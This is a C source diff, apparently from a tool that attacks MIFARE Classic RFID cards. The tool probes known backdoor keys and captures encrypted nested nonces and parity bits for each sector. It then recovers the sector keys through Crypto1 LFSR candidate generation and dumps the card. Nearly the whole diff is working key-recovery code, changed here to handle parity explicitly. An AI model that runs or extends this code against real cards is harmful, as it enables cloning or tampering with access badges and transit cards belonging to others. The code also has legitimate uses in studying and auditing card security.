@@ -319,7 +319,7 @@ int main(
         fflush(stdout);
 
         // Advanced verification at sector 0
-        bool auth_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(0), backdoor_keys[i], auth_uid, NULL, false);
+        bool auth_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(0), backdoor_keys[i], auth_uid, NULL, NULL, false);
         if (auth_success)
         {
             backdoor_key = backdoor_keys[i];
@@ -337,7 +337,7 @@ int main(
 
     if (backdoor_key == 0x00)
     {
-        fprintf(stdout, "Card is not vulnerable to backdoor attacks.\n\n");
+        fprintf(stdout, "Card is not vulnerable to backdoor attack, or has no known key...\n\n");
         goto dump_card;
     }
 
@@ -353,29 +353,21 @@ int main(
         uint64_t nt, nt_enc;
         bool auth_success, auth_enc_success;
 
-        auth_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A + 4, sector_to_trailer(s), backdoor_key, auth_uid, &nt, true);
-        auth_enc_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(s), backdoor_key, auth_uid, &nt_enc, false);
+        auth_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A + 4, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_a, &sectors[s].par_a, true);
+        auth_enc_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_enc_a, &sectors[s].par_enc_a, false);
         if (!auth_success || !auth_enc_success)
         {
             fprintf(stdout, "Failed to authenticate sector %02d, key A using backdoor command\n", s);
             exit(EXIT_FAILURE);
         }
 
-        // Discard parity bit
-        sectors[s].nt_a = nt >> 1;
-        // Extract keystream
-        sectors[s].keystr_a = nt_enc ^ nt;
-
-        auth_success = mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B + 4, sector_to_trailer(s), backdoor_key, auth_uid, &nt, true);
-        auth_enc_success = mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B, sector_to_trailer(s), backdoor_key, auth_uid, &nt_enc, false);
+        auth_success = mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B + 4, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_b, &sectors[s].par_b, true);
+        auth_enc_success = mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B, sector_to_trailer(s), backdoor_key, auth_uid, &sectors[s].nt_enc_b, &sectors[s].par_enc_b, false);
         if (!auth_success || !auth_enc_success)
         {
             fprintf(stdout, "Failed to authenticate sector %02d, key B using backdoor command\n", s);
             exit(EXIT_FAILURE);
         }
-
-        sectors[s].nt_b = nt >> 1;
-        sectors[s].keystr_b = nt_enc ^ nt;
     }
 
     // Initialize table for comparing LFSR states
@@ -391,7 +383,7 @@ int main(
 
         // Generate candidates
         if (!sectors[s].found_key_a)
-            generate_keys(sectors[s].nt_a, sectors[s].keystr_a, auth_uid, &recovery_keys_a, &recovery_keys_a_len);
+            generate_keys(sectors[s].nt_a, sectors[s].par_a, sectors[s].nt_enc_a, sectors[s].par_enc_a, auth_uid, &recovery_keys_a, &recovery_keys_a_len);
         else
         {
             recovery_keys_a = &sectors[s].key_a;
@@ -402,7 +394,7 @@ int main(
         size_t recovery_keys_b_len = 0;
 
         if (!sectors[s].found_key_b)
-            generate_keys(sectors[s].nt_b, sectors[s].keystr_b, auth_uid, &recovery_keys_b, &recovery_keys_b_len);
+            generate_keys(sectors[s].nt_b, sectors[s].par_b, sectors[s].nt_enc_b, sectors[s].par_enc_b, auth_uid, &recovery_keys_b, &recovery_keys_b_len);
         else
         {
             recovery_keys_b = &sectors[s].key_b;
@@ -835,7 +827,8 @@ bool mf_nested_auth(
     uint8_t block,
     uint64_t key,
     uint32_t uid,
-    uint64_t *dest,
+    uint32_t *nt_dest,
+    uint8_t *par_dest,
     bool decrypt)
 {
     // TODO: Set NP_HANDLE_PARITY and NP_HANDLE_CRC only once if possible
@@ -941,22 +934,22 @@ bool mf_nested_auth(
         exit(EXIT_FAILURE);
     }
 
-    // Save the encrypted nonce ({nt})
+    // Save the encrypted nonce + last parity bit
     uint32_t nt_enc = bytes_to_num(abt_res, 4);
-
-    if (dest != NULL)
+    uint8_t par_enc = abt_res_par[3];
+    
+    if (decrypt)
     {
-        // 32 bit nonce + 1 parity bit
-        if (decrypt)
-        {
-            crypto1_init(&pcs, key);
-            nt_enc ^= crypto1_word(&pcs, nt_enc ^ uid, 1);
+        crypto1_init(&pcs, key);
 
-            *dest = (uint64_t) nt_enc << 1 | oddparity(nt_enc & 0xFF);
-        }
-        else
-            *dest = (uint64_t) nt_enc << 1 | abt_res_par[3];
+        nt_enc ^= crypto1_word(&pcs, nt_enc ^ uid, 1);
+        par_enc = oddparity(nt_enc & 0xFF);
     }
+
+    if (nt_dest != NULL)
+        *nt_dest = nt_enc;
+    if (par_dest != NULL)
+        *par_dest = par_enc;
 
     mf_device_set(NP_HANDLE_CRC, true);
     mf_device_set(NP_HANDLE_PARITY, true);
